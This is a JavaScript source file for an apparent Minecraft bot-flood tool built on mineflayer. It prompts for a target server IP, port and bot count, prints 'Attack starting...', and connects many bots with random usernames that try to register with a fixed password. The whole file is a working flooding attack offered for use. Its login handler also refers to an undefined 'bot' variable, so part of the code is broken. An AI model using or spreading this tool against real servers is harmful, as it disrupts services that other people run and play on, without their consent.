var mineflayer = require('mineflayer');
var colors = require('colors');
const readline = require('readline');


const nameChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".split('')

function msleep(n) {
  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, n);
}
function sleep(n) {
  msleep(n*1000);
}

let genName = () => {
    let gen = ''
    
    for (let i = 0; i < 12; i++){
    
        gen += nameChars[Math.floor(Math.random() * nameChars.length)]

	}

    return gen

}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

const question1 = () => {
  return new Promise((resolve, reject) => {
    rl.question('Server ip: '.yellow, (serverIP) => {
      console.log("---------------------------------------------")
      console.log("Set to: ".cyan + `${serverIP}`.bold.white)
      resolve(serverIP)
      servIP = `${serverIP}`;
    })
  })
}

const question2 = () => {
  return new Promise((resolve, reject) => {
    console.log("---------------------------------------------")
    rl.question('Server port (optional): '.yellow, (serverPORT) => {
      if (serverPORT == ""){
            var serverPORT = "25565"
            console.log("Set to: ".cyan + `${serverPORT}`.bold.white)
            resolve()
            servPORT = `${serverPORT}`;
      } else {
        console.log("Set to: ".cyan + `${serverPORT}`.bold.white)
        resolve(serverPORT)
        servPORT = `${serverPORT}`;
      }
    })
  })
}

const question3 = () => {
  return new Promise((resolve, reject) => {
    console.log("---------------------------------------------")
    rl.question('Bot number: '.yellow, (botNumber) => {
      console.log("Set to: ".cyan + `${botNumber}`.white)
      resolve(botNumber)
      bNum = `${botNumber}`;
    })
  })
}

const question4 = () => {
  return new Promise((resolve, reject) => {
    console.log("---------------------------------------------")
    rl.question('Run? '.yellow, (runyn) => {
      if (runyn == "yes"){
      
     console.log("Attack starting...".cyan)
     resolve()

      //Bot config
      for (let i = 0; i < bNum; i++){

        let genBot = mineflayer.createBot({
        
            host: servIP,
            port: servPORT,
            username: genName(),

	    })

        genBot.on('login', function() {
      
            console.log("A bot joined !".bold.yellow);
            bot.chat("/register minesploit minesploit");
            bot.chat("/login minesploit");
            sleep(1);

		})


	  }

	  } else if (runyn == "no"){
      
        console.log("Exiting...".red)
        resolve()
        process.exit()

	  }
    })
  })
}

const main = async () => {
    console.clear()
  await question1()
  await question2()
  await question3()
  await question4()
  rl.close()
}

 main()